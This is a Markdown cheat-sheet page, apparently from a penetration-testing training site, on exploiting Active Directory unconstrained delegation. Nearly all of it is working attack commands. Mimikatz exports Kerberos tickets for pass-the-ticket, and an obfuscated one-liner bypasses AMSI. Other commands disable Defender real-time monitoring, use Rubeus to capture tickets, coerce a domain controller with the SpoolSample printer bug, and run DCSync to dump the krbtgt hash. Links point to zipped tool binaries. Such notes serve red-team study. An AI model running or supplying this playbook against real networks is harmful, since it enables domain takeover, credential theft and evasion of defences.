---
layout: page
title: "# AD Uncontrained Delegation"
permalink: /ad_cheatsheets/ad_uncontrained_delegation
---

# AD Uncontrained Delegation

## Find Servers that has unconstrained delegation

```powershell
#PowerView
Get-NetComputer -Unconstrained | select -ExpandProperty name
#OR Powerview All Info (find - TRUSTED_FOR_DELEGATION to find computer that has unconstrained delegation)
Get-DomainComputer -Unconstrained
```

We need to have local admin priv on the device that has Uncontstrained Delegation rights

## MimiKatz - Get all tickets:

*If no tickets are present we might need to enforce them by activating the app that needs unconstrained delegation. Or you might choose to exploit the printerbug - PrintSpoofer

```powershell
privilege::debug

sekurlsa::tickets
```

## MimiKatz - Export Tickets and import them into our process:

```powershell
privilege::debug

sekurlsa::tickets /export

kerberos::ptt %NAME OF EXPORTED TICKET%.kirbi

#OR in a oneliner
Invoke-Mimikatz -Command '"kerberos::ptt C:\Users\appadmin\Documents\user648\[0;334d6c]-2-0-60a10000-Administrator@krbtgt-DOLLARCORP.MONEYCORP.LOCAL.kirbii"'

#Use PSEXEC to test access to domain controller:
C:\Tools\SysinternalsSuite\PsExec.exe \\dc01 cmd
```

## Mimikatz On another Session

Use below approach to connect to another session and use MimiKatz

```powershell
powershell -ep bypass

$sess = New-PSSession -ComputerName dcorp-appsrv.dollarcorp.moneycorp.local

Enter-PSSession -Session $sess

sET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    GeT-VariaBle  ( "1Q2U"  +"zX"  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System'  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f'amsi','d','InitFaile'  ),(  "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )

exit

Invoke-Command -FilePath C:\AD\Tools\Invoke-Mimikatz.ps1 -Session $sess

Enter-PSSession -Session $sess

Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'

ls | select name
```

When we don't see a ticket, we need to trick DA

```powershell
#Using PowerSploit UserHunter
Invoke-UserHunter -ComputerName dcorp-appsrv -Poll 100 -UserName Administrator -Delay 5 -Verbose
```

## Using Rubeus Monitor For Authentication

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true

Copy-Item -ToSession $appsrv1 -Path C:\AD\Tools\Rubeus.exe -Destination C:\Users\appadmin\Downloads

.\Rubeus.exe monitor /interval:5/nowrap

. .\Invoke-Mimikatz.ps1

Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'

```

Rubeus - Compiled x64 - .NET 4.7

[Rubeus.zip](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/dfa51442-deac-429b-a602-a306de77dbd4/Rubeus.zip)

## Exploiting Spoolss (printer) for non-interactige escalation

We do this by retrieving the Domain Controllers computer account ticket.

```powershell
#Check it the spooler is listening (port 445):
dir \\dc01\pipe\spoolss

#Launch Rubeus in monitor mode to refresh every 5 seconds to listen to the domain controller:
Rubeus.exe monitor /interval:5 /filteruser:DC01$

#Launch a second CMD and trigger the compiled version of https://github.com/leechristensen/SpoolSample to trigger the print spooler change notification with SpoolSample.exe by specifying the target machine and capture server. Sometimes the tool needs to be run multiple times before the change notification callback takes place:
SpoolSample.exe DC01 APPSRV01

#Read the ticketname and inject it back in our own process:
Rubeus.exe ptt /ticket:%TICKETNAME%

#Having the domain controller Computer Ticket we are not a domain admin but we can perform a dcsync to dump the password hash of any user:
lsadump::dcsync /domain:prod.corp1.com /user:prod\krbtgt
```

Download SpoolSample: [https://github.com/leechristensen/SpoolSample](https://github.com/leechristensen/SpoolSample)

[SpoolSample.zip](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/6adc162f-d776-4fb1-915e-696b25541d6b/SpoolSample.zip)

* We can also use krbrelayx - [https://github.com/dirkjanm/krbrelayx](https://github.com/dirkjanm/krbrelayx) to do all the above from our Kali machine.

[Hunting in Active Directory: Unconstrained Delegation & Forests Trusts](https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1)

[Kerberos Unconstrained Delegation](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)
